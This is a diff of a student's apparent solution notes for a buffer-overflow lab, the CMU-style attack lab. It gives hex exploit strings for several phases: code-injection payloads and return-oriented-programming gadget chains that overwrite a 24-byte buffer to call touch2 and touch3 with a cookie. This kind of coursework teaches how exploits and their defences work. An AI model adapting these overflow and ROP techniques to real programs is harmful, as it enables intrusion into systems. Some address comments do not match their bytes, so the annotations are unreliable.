@@ -1,0 +1,67 @@
+00 00 00 00 00 00 00 00 # this adds
+00 00 00 00 00 00 00 00 # 24 bytes
+00 00 00 00 00 00 00 00 # of buffer
+26 1e 42 00 00 00 00 00 # gadget 1: movq %rsp, %rax; retq
+45 1d 42 00 00 00 00 00 # gadget 2: movq %rax, %rdi; retq
+61 1d 42 00 00 00 00 00 # gadget 3: popq %rax; removes next 8 bytes of stack
+                          (cookie) and stores it in %rax
+48 00 00 00 00 00 00 00 # buffer, and make rax jump 48 bits forward to touch3
+c1 1d 42 00 00 00 00 00 # gadget 4: movl %eax, %ecx
+1f 1e 42 00 00 00 00 00 # gadget 5: movl %ecx, %edx
+1a 1e 42 00 00 00 00 00 # gadget 6: movl %edx, %esi
+7d 1d 42 00 00 00 00 00 # lea add_xy; adds rdi and rsi and puts in rax
+45 1d 42 00 00 00 00 00 # gadget 7: movq %rax, %rdi; retq
+b6 1c 42 00 00 00 00 00 # touch3 = 421cb6; called after the cookie is set
+37 30 39 66 39 30 35 30 # cookie (text) format = 37 30 39 66 39 30 35 30
+                          removed when popq is called
+recap:
+//24-byte buffer
+//rsp -> rax
+//rax -> rdi
+//pop rax
+//8-byte buffer, and jump to touch3
+//eax -> esi
+//lea add_xy (rdi + rsi -> rax)
+//rax -> rdi
+//touch3
+//cookie (text)
+
+
+for reference, phase3notes.txt
+48 c7 c7 30 6f 64 55 c3 # this sets the cookie: movq $55646f30, %rdi
+                                                retq
+    set cookie at the last line of this code:
+    %rsp + buffer(=24) + 8 bytes for %rsp + 8 bytes for touch3
+  = %rsp + 0x18 + 8 + 8
+  = %rsp + 0x28
+  = 55646f08 + 28 = 55646f30
+00 00 00 00 00 00 00 00 # this adds 24
+00 00 00 00 00 00 00 00 # bytes of buffer
+08 6f 64 55 00 00 00 00 # %rsp = 55646f08; when getbuf is called, this will
+                          run the assembly code (first line) at the top of the
+                          stack, which will set the cookie to the last line
+b6 1c 42 00 00 00 00 00 # touch3 = 421cb6; called after the cookie is set
+37 30 39 66 39 30 35 30 # cookie in text format = hex 709f9050 to ASCII text =
+                          37 30 39 66 39 30 35 30; address is 0x55646f30
+
+for reference, phase4notes.txt
+00 00 00 00 00 00 00 00 # this adds
+00 00 00 00 00 00 00 00 # 24 bytes
+00 00 00 00 00 00 00 00 # of buffer
+61 1d 42 00 00 00 00 00 # gadget 1: popq %rax; removes next 8 bytes of stack
+                          (cookie) and stores it in %rax
+50 90 9f 70 00 00 00 00 # cookie = 709f9050; removed when popq is called
+45 1d 42 00 00 00 00 00 # gadget 2: movq %rax, %rdi; retq
+                          moves %rax (cookie) to %rdi, then returns
+e2 1b 42 00 00 00 00 00 # touch2 = 421bb6
+
+
+for reference, phase2notes.txt
+48 c7 c7 50 90 9f 70 c3 # this sets the val = cookie: movq $709f9050, %rdi
+                                                      retq
+00 00 00 00 00 00 00 00 # this adds 24
+00 00 00 00 00 00 00 00 # bytes of buffer
+08 6f 64 55 00 00 00 00 # %rsp = 55646f08; when getbuf is called, it will
+                          return the assembly code (first line) at the top of
+                          the stack, which will set the cookie
+e2 1b 42 00 00 00 00 00 # touch2 = 421bb6; called after the cookie is set
